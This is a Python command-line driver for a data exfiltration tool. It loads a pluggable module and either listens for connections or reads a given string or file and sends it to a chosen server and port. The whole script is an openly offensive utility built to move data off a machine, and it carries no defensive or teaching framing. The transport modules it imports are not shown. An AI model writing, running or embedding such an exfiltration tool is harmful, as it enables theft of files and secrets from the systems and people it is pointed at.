#!/usr/bin/env python
# -*- coding: utf-8 -*-

import argparse
import importlib

#
# Process our command line arguments.
#
p = argparse.ArgumentParser(description='Exfiltrate data.')

data = p.add_mutually_exclusive_group()
data.add_argument('-d', metavar='string', help='String of data to exfiltrate.')
data.add_argument('-f', metavar='filename', help='File to send.')

transmit = p.add_mutually_exclusive_group(required=True)
transmit.add_argument('-l', action='store_true', help='Listen for a connection.')
transmit.add_argument('-s', metavar='server', help='Server where data should be sent. Can be a hostname or an IP address.')

p.add_argument('-p', metavar='port', help='Port to use when listening or connecting.')
p.add_argument('module_name', help='Exfiltration module to use.')

args = p.parse_args()


#
# Attempt to import the specified module.
#
try:
    m = importlib.import_module('lib.' + args.module_name)

except:
    print('Error: Module {0} was not found.'.format(args.module_name))


#
# Setup our listener or send our data.
#
if args.l is True:
    m.listen(args.p)
else:
    if (args.d is None) and (args.f is None):
        print('Error: No data to send.')

    if args.d is not None:
        data = args.d

    if args.f is not None:
        data = open(args.f).read()

    m.send(args.s, args.p, data)